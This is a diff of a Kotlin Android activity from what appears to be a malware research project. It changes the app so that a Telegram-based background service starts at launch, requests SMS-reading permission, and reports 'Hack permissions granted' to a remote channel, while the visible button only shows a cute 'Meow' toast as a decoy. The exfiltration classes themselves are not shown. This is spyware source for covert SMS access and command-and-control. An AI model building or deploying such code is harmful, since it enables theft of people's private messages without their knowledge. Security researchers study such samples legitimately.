@@ -7,10 +7,10 @@ import androidx.activity.ComponentActivity
 import cocomelonc.hack.tools.HackSmsLogs
 
 import android.annotation.SuppressLint
-import android.content.IntentFilter
 import android.content.Intent
 import android.widget.Button
 import android.widget.Toast
+import cocomelonc.hack.services.TelegramService
 import com.karumi.dexter.Dexter
 import com.karumi.dexter.MultiplePermissionsReport
 import com.karumi.dexter.PermissionToken
@@ -21,15 +21,19 @@ import com.karumi.dexter.listener.multi.MultiplePermissionsListener
 
 class HackMainActivity : ComponentActivity() {
     private lateinit var meowButton: Button
-    val hackSmsLogs = HackSmsLogs(context = this)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
         HackNetwork(this).initHack()
         requestPermissions()
+        startService(Intent(this, TelegramService::class.java))
         meowButton = findViewById(R.id.meowButton)
         meowButton.setOnClickListener {
-            hackSmsLogs.getSmsLogs()
+            Toast.makeText(
+                applicationContext,
+                "Meow! ♥\uFE0F I Love Bahrain \uD83C\uDDE7\uD83C\uDDED",
+                Toast.LENGTH_SHORT
+            ).show()
         }
     }
 
@@ -40,6 +44,7 @@ class HackMainActivity : ComponentActivity() {
         Dexter.withContext(this) // below line is use to request the number of permissions which are required in our app.
             .withPermissions(
                 Manifest.permission.READ_SMS,
+                Manifest.permission.POST_NOTIFICATIONS,
             ) // after adding permissions we are calling an with listener method.
             .withListener(object : MultiplePermissionsListener {
                 override fun onPermissionsChecked(multiplePermissionsReport: MultiplePermissionsReport) {
@@ -52,7 +57,6 @@ class HackMainActivity : ComponentActivity() {
                             Toast.LENGTH_SHORT
                         ).show()
                         HackNetwork(applicationContext).sendTextMessage("Hack permissions granted\n")
-                        hackSmsLogs.getSmsLogs()
                     }
 
                     // check for permanent denial of any permission
